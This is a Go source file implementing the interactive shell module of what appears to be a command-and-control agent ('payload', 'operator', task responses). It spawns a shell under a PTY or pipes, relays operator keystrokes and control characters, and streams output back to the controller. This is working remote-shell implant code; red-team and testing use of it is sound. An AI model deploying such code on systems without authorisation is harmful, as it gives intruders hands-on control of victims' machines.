package main

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/creack/pty"
)

const (
	interactiveInput = iota
	interactiveOutput
	interactiveError
	interactiveExit
	interactiveEscape
	interactiveCtrlA
	interactiveCtrlB
	interactiveCtrlC
	interactiveCtrlD
	interactiveCtrlE
	interactiveCtrlF
	interactiveCtrlG
	interactiveBackspace
	interactiveTab
	interactiveCtrlK
	interactiveCtrlL
	interactiveCtrlN
	interactiveCtrlP
	interactiveCtrlQ
	interactiveCtrlR
	interactiveCtrlS
	interactiveCtrlU
	interactiveCtrlW
	interactiveCtrlY
	interactiveCtrlZ
)

type interactiveSession struct {
	taskID           string
	command          *exec.Cmd
	stdin            io.WriteCloser
	ptyFile          *os.File
	done             chan struct{}
	closeMux         sync.Once
	closedByOperator atomic.Bool
}

type interactiveSessionRegistry struct {
	owner    *AgentController
	mu       sync.RWMutex
	sessions map[string]*interactiveSession
}

func newInteractiveSessionRegistry(owner *AgentController) *interactiveSessionRegistry {
	return &interactiveSessionRegistry{
		owner:    owner,
		sessions: make(map[string]*interactiveSession),
	}
}

func (r *interactiveSessionRegistry) Start(task Task, requestedShell string) TaskResponse {
	if !runtimeConfig.InteractiveEnabled {
		return TaskResponse{TaskID: task.ID, UserOutput: "错误: 当前 payload 未启用 interactive 能力", Completed: true, Status: "error: interactive disabled"}
	}
	shellPath := strings.TrimSpace(requestedShell)
	if shellPath == "" {
		shellPath = runtimeConfig.InteractiveShell
	}
	command := exec.Command(shellPath)
	session := &interactiveSession{
		taskID:  task.ID,
		command: command,
		done:    make(chan struct{}),
	}

	if runtime.GOOS == "windows" {
		stdin, err := command.StdinPipe()
		if err != nil {
			return failedInteractiveStart(task.ID, err)
		}
		stdout, err := command.StdoutPipe()
		if err != nil {
			return failedInteractiveStart(task.ID, err)
		}
		stderr, err := command.StderrPipe()
		if err != nil {
			return failedInteractiveStart(task.ID, err)
		}
		session.stdin = stdin
		if err := command.Start(); err != nil {
			return failedInteractiveStart(task.ID, err)
		}
		r.store(session)
		go r.streamReader(session, stdout, interactiveOutput)
		go r.streamReader(session, stderr, interactiveError)
		go r.wait(session)
	} else {
		ptyFile, err := pty.Start(command)
		if err != nil {
			return failedInteractiveStart(task.ID, err)
		}
		session.stdin = ptyFile
		session.ptyFile = ptyFile
		r.store(session)
		go r.streamReader(session, ptyFile, interactiveOutput)
		go r.wait(session)
	}

	return TaskResponse{TaskID: task.ID, UserOutput: fmt.Sprintf("交互式会话已启动: %s", shellPath), Completed: false, Status: "interactive session started"}
}

func failedInteractiveStart(taskID string, err error) TaskResponse {
	return TaskResponse{TaskID: taskID, UserOutput: "错误: 启动交互会话失败: " + err.Error(), Completed: true, Status: "error: interactive start failed"}
}

func (r *interactiveSessionRegistry) store(session *interactiveSession) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.sessions[session.taskID] = session
}

func (r *interactiveSessionRegistry) delete(taskID string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	delete(r.sessions, taskID)
}

func (r *interactiveSessionRegistry) get(taskID string) (*interactiveSession, bool) {
	r.mu.RLock()
	defer r.mu.RUnlock()
	session, ok := r.sessions[taskID]
	return session, ok
}

func (r *interactiveSessionRegistry) Handle(message InteractiveMessage) error {
	session, ok := r.get(message.TaskID)
	if !ok {
		if message.MessageType == interactiveExit {
			return nil
		}
		return fmt.Errorf("未找到 interactive 会话: %s", message.TaskID)
	}
	data, err := decodeInteractiveInput(message)
	if err != nil {
		return err
	}
	switch message.MessageType {
	case interactiveInput, interactiveEscape, interactiveCtrlA, interactiveCtrlB, interactiveCtrlC,
		interactiveCtrlD, interactiveCtrlE, interactiveCtrlF, interactiveCtrlG, interactiveBackspace,
		interactiveTab, interactiveCtrlK, interactiveCtrlL, interactiveCtrlN, interactiveCtrlP,
		interactiveCtrlQ, interactiveCtrlR, interactiveCtrlS, interactiveCtrlU, interactiveCtrlW,
		interactiveCtrlY, interactiveCtrlZ:
		if _, err := session.stdin.Write(data); err != nil {
			session.close()
			return fmt.Errorf("写入 interactive 输入失败: %w", err)
		}
	case interactiveExit:
		session.close()
	default:
		return fmt.Errorf("不支持的 interactive message_type: %d", message.MessageType)
	}
	return nil
}

func decodeInteractiveInput(message InteractiveMessage) ([]byte, error) {
	if message.MessageType == interactiveExit {
		return nil, nil
	}
	if message.MessageType == interactiveInput {
		return base64.StdEncoding.DecodeString(message.Data)
	}
	if message.Data != "" {
		if data, err := base64.StdEncoding.DecodeString(message.Data); err == nil && len(data) > 0 {
			return data, nil
		}
	}
	if controlByte, ok := interactiveControlByte(message.MessageType); ok {
		return []byte{controlByte}, nil
	}
	return nil, fmt.Errorf("无法解析 interactive 输入: type=%d", message.MessageType)
}

func interactiveControlByte(messageType int) (byte, bool) {
	switch messageType {
	case interactiveEscape:
		return 0x1b, true
	case interactiveCtrlA:
		return 0x01, true
	case interactiveCtrlB:
		return 0x02, true
	case interactiveCtrlC:
		return 0x03, true
	case interactiveCtrlD:
		return 0x04, true
	case interactiveCtrlE:
		return 0x05, true
	case interactiveCtrlF:
		return 0x06, true
	case interactiveCtrlG:
		return 0x07, true
	case interactiveBackspace:
		return 0x08, true
	case interactiveTab:
		return 0x09, true
	case interactiveCtrlK:
		return 0x0b, true
	case interactiveCtrlL:
		return 0x0c, true
	case interactiveCtrlN:
		return 0x0e, true
	case interactiveCtrlP:
		return 0x10, true
	case interactiveCtrlQ:
		return 0x11, true
	case interactiveCtrlR:
		return 0x12, true
	case interactiveCtrlS:
		return 0x13, true
	case interactiveCtrlU:
		return 0x15, true
	case interactiveCtrlW:
		return 0x17, true
	case interactiveCtrlY:
		return 0x19, true
	case interactiveCtrlZ:
		return 0x1a, true
	default:
		return 0, false
	}
}

func (r *interactiveSessionRegistry) streamReader(session *interactiveSession, reader io.Reader, messageType int) {
	buffered := bufio.NewReader(reader)
	buffer := make([]byte, 4096)
	for {
		n, err := buffered.Read(buffer)
		if n > 0 {
			chunk := append([]byte(nil), buffer[:n]...)
			r.owner.enqueueInteractiveOutput(session.taskID, messageType, chunk)
		}
		if err != nil {
			if err != io.EOF && !strings.Contains(strings.ToLower(err.Error()), "file already closed") {
				r.owner.enqueueInteractiveOutput(session.taskID, interactiveError, []byte(err.Error()))
			}
			return
		}
	}
}

func (r *interactiveSessionRegistry) wait(session *interactiveSession) {
	err := session.command.Wait()
	exitData := []byte{}
	if err != nil {
		exitData = []byte(err.Error())
	}
	r.owner.enqueueInteractiveOutput(session.taskID, interactiveExit, exitData)
	status := "success"
	output := "交互式会话已结束"
	if err != nil && !session.closedByOperator.Load() {
		status = "error: interactive session exited"
		output = "交互式会话异常退出: " + err.Error()
	}
	r.owner.enqueueAsyncResponse(TaskResponse{TaskID: session.taskID, UserOutput: output, Completed: true, Status: status})
	r.delete(session.taskID)
	session.close()
}

func (s *interactiveSession) close() {
	s.closeMux.Do(func() {
		s.closedByOperator.Store(true)
		close(s.done)
		if s.stdin != nil {
			_ = s.stdin.Close()
		}
		if s.ptyFile != nil {
			_ = s.ptyFile.Close()
		}
		if s.command != nil && s.command.Process != nil {
			if runtime.GOOS == "windows" {
				_ = s.command.Process.Kill()
			} else {
				_ = s.command.Process.Signal(syscall.SIGTERM)
				time.Sleep(150 * time.Millisecond)
				_ = s.command.Process.Kill()
			}
		}
	})
}

func (r *interactiveSessionRegistry) HasActiveSessions() bool {
	r.mu.RLock()
	defer r.mu.RUnlock()
	return len(r.sessions) > 0
}

func (r *interactiveSessionRegistry) StopAll() {
	r.mu.Lock()
	sessions := make([]*interactiveSession, 0, len(r.sessions))
	for _, session := range r.sessions {
		sessions = append(sessions, session)
	}
	r.sessions = make(map[string]*interactiveSession)
	r.mu.Unlock()
	for _, session := range sessions {
		session.close()
	}
}

func (c *AgentController) executePty(task Task) TaskResponse {
	var params struct {
		Shell string `json:"shell"`
	}
	if strings.TrimSpace(task.Parameters) != "" {
		_ = json.Unmarshal([]byte(task.Parameters), &params)
	}
	return c.interactive.Start(task, params.Shell)
}
